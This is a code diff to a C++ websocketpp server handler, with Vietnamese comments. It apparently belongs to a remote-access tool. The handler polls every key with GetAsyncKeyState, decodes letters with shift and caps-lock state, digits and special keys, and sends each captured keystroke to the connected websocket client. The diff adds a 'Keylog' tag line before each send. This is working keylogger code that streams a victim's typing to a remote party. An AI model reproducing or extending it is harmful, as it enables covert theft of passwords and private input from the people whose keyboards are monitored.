@@ -209,6 +209,7 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                 for (int KEY = 8; KEY <= 255; KEY++){
                     if (GetAsyncKeyState(KEY) == -32767) {
                         if (SpecialKeys(KEY, output) == true) {
+                            s->send(hdl, "Keylog", msg->get_opcode());
                             s->send(hdl, output, msg->get_opcode());
                         }
                         else if (KEY >= 65 && KEY <= 90) { // Chữ cái A-Z
@@ -217,15 +218,18 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                             bool is_uppercase = shift_pressed ^ caps_active;
                             
                             if (is_uppercase) {
+                                s->send(hdl, "Keylog", msg->get_opcode());
                                 s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
                             } 
                             else {
+                                s->send(hdl, "Keylog", msg->get_opcode());
                                 s->send(hdl, std::string(1, char(KEY + 32)), msg->get_opcode());
                             }
                             
                         } 
                         // 3. Xử lý các ký tự khác (số 0-9, dấu chấm câu, v.v.)
                         else if (KEY >= 48 && KEY <= 57) { // Số 0-9
+                            s->send(hdl, "Keylog", msg->get_opcode());
                             s->send(hdl, std::string(1, char(KEY)), msg->get_opcode());
                         }
                     }
